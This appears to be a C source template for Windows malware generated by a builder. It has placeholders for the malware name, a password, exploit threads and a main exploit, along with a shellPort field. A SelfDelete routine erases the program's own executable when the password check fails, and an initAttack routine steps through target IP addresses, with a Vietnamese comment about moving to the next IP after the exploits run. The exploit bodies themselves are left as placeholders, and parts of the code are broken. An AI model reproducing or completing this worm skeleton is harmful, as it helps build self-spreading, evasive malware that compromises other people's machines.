// gcc -o hostip hostip.c -lws2_32
typedef struct threadData {
    int shellPort;
    const char strIP[16];
} threadData, *PthreadData;
#include "[malName].h"
int main(int argc, char** argv){

	if(argc==[nArgc][malPass]){/*normal process*/
	//[moduleThreads]

	//[mainExploit]	
	}
	//[elseIf]
	else{
		SelfDelete();
		return 0;
	}
}
void SelfDelete(){
	char out[100];
	GetModuleFileNameA(NULL,out,100);
	printf("%s\n",out);
	int ret;
	FILE *fp;
	fp = fopen(out, "w");
	fclose(fp);
	ret = remove(out);
	if(ret == 0) {
		printf("File deleted successfully");
	} else {
		printf("Error: unable to delete the file");
	}
}
void initAttack(int ipAddress[]){
	
	register int i,j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
	
	//[exploitThreads]

    //Tăng IP lên sau khi chạy hết các exploit
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
